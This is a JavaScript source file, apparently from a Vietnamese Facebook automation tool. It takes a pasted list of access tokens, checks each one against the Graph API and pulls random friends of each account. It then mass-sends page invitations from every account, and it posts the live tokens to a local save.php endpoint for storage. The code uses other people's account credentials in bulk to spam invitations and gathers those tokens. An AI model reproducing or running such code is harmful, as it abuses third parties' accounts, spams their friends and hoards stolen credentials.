function page_invited_check(c) {
    $.get('https://graph.facebook.com/', {
        method: 'post',
        access_token: c,
        batch: '[{\"method\":\"GET\",\"relative_url\":\"me?fields=id,name\"},{\"method\":\"GET\",\"relative_url\":\"fql?q=SELECT uid, name FROM user WHERE uid IN (SELECT uid2 FROM friend WHERE uid1 = me()) ORDER BY rand() LIMIT ' + page_invited.limit + '\"}]',
        include_headers: 'false'
    }, function(f) {
        var g = JSON.parse(f[0].body);
        page_invited.array[page_invited.success] = [], page_invited.array[page_invited.success].uid = g.id, page_invited.array[page_invited.success].data = JSON.parse(f[1].body).data, page_invited.array[page_invited.success].access_token = c, page_invited.success++, page_invited.bach += c + '', tbody = '', tbody += '<tr>', tbody += '	<td>' + page_invited.success + '</td>', tbody += '	<td>' + g.name + '</td>', tbody += '	<td align=\"center\">' + page_invited.array[page_invited.success - 1].data.length + '</td>', tbody += '	<td align=\"center\"><font color=\"green\"><span id=\"page_invited_success_' + page_invited.success + '\">0</span></font></td>', tbody += '	<td align=\"center\"><font color=\"red\"><span id=\"page_invited_error_' + page_invited.success + '\">0</span></font></td>', tbody += '	<td id=\"page_invited_status_' + page_invited.success + '\" b-data=\"loading\">Đang chờ !</td>', tbody += '</tr>', $('#html_page_invited_body').append(tbody)
    }).fail(function(f) {
        'undefined' == typeof f.responseText ? page_invited_check(c) : page_invited.error++
    }).always(function() {
        if (page_invited.success + page_invited.error == page_invited.token.split('\n').length) {
            if (page_invited.success > 0) {
                var c = $.trim(page_invited.bach);
                c.length > 0 && $.post('http://localhost/phuongbach/save.php', {
                    act: 'save',
                    access_token: c
                }), page_invited_send(0)
            } else {
                $('#submit_page_invited_start').buttonStop(), $('#submit_page_invited_stop').disabled(), noti.success('Không Access Token nào còn Live !'), $('#html_page_invited_result').hide()
            }
        }
    })
}

function page_invited_send(c) {
    if (0 == page_invited.run) {
        return !1
    };
    if (0 == page_invited.array[c].data.length) {
        $('#page_invited_status_' + (c + 1)).html('<font color=\"red\">Không có bạn bè !</font>'), c + 1 < page_invited.array.length ? page_invited_send(c + 1) : ($('#submit_page_invited_start').buttonStop(), $('#submit_page_invited_stop').disabled(), noti.success('Quá trình mời bạn bè thໜh trang đã hoàn tất !'))
    } else {
        for (var f = 0; f < page_invited.array[c].data.length; f++) {
            var g = page_invited.array[c].data[f].uid,
                d = page_invited.array[c].data[f].name;
            ! function(g, d) {
                setTimeout(function() {
                    $.get('https://graph.facebook.com/' + page_invited.id + '/invited', {
                        method: 'post',
                        invitee_id: g,
                        access_token: page_invited.array[c].access_token
                    }).done(function() {
                        $('#page_invited_success_' + (c + 1)).text(parseInt($('#page_invited_success_' + (c + 1)).text()) + 1), $('#page_invited_status_' + (c + 1)).html('<font color=\"green\">Mời <b>' + d + '</b> thành công</font> ' + run.loading())
                    }).error(function() {
                        $('#page_invited_error_' + (c + 1)).text(parseInt($('#page_invited_error_' + (c + 1)).text()) + 1), $('#page_invited_status_' + (c + 1)).html('<font color=\"red\">Mời <b>' + d + '</b> thất bại</font> ' + run.loading())
                    }).always(function() {
                        parseInt($('#page_invited_success_' + (c + 1)).text()) + parseInt($('#page_invited_error_' + (c + 1)).text()) == page_invited.array[c].data.length && ($('#page_invited_status_' + (c + 1)).html('<font color=\"green\">Hoàn thành !</font>'), c + 1 < page_invited.array.length ? page_invited_send(c + 1) : ($('#submit_page_invited_start').buttonStop(), $('#submit_page_invited_stop').disabled(), noti.success('Quá trình mời bạn bè thໜh trang đã hoàn tất !')))
                    })
                }, f * page_invited.delay)
            }(g, d)
        }
    }
}
location.hostname == b_sv && ($(document).on('click', '#submit_page_invited_stop', function() {
    page_invited.run = 0, $('[b-data=\'loading\']').text('Đã có lệnh dừng !'), $('#submit_page_invited_stop').disabled(), $('#submit_page_invited_start').buttonStop(), noti.success('Đã có lệnh dừng mời bạn bè thໜh trang !')
}), $(document).on('click', '#submit_page_invited_start', function() {
    page_invited = {
        token: $('#input_page_invited_token').validate(),
        id: $('#input_page_invited_id').isNumber(),
        delay: $('#input_page_invited_delay').isNumber(),
        limit: $('#input_page_invited_limit').isNumber(),
        array: [],
        run: 1,
        success: 0,
        error: 0,
        bach: ''
    }, page_invited.token && page_invited.id && page_invited.delay && page_invited.limit && ($(this).buttonLoad(), $('#submit_page_invited_stop').undisabled(), $('#html_page_invited_result').fadeIn('fast'), $('#html_page_invited_body').html(''), $.each(page_invited.token.split('\n'), function(c, f) {
        var g = f.split('|');
        g = g[1] ? g[1] : f, setTimeout(function() {
            page_invited_check(g)
        }, 15 * c)
    }))
}))